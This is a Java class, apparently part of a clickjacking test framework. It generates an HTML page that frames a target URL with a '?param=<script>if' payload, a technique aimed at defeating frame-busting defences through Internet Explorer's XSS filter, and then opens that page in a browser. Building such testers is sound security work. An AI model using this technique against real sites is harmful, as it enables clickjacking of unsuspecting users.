package com.dependability.clickjacking.cration.filterXss.iE;

import java.awt.Desktop;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import com.dependability.clickjacking.clickInterface.ClickJacking;


public class FilterXssIe implements ClickJacking {
	private String src;
	private File f;
	public FilterXssIe(String src){
		this.src = src;
		f = new File("src\\main\\webapp\\filter_xss_ie.html");
	}
	
	@Override
	public String getSrc() {
		return src;
	}
	
	@Override
	public void setSrc(String src) {
		this.src = src;
		
	}
	
	@Override
	public File getHtmlFile() {
		return f;
	}
	
	@Override
	public void setHtmlFile(File f) {
		this.f = f;
	}
	
	@Override
	public void run() throws IOException{
		Desktop.getDesktop().browse(f.toURI());
	}
	@Override
	public void creation() throws IOException {
        BufferedWriter bw;
		bw = new BufferedWriter(new FileWriter(f));
	    bw.write("<html><body>");
	    bw.write("<iframe src=\"" + src + "?param=<script>if\"" + "></iframe>");
	    bw.write("</body></html>");
	    bw.close();		
	}

}
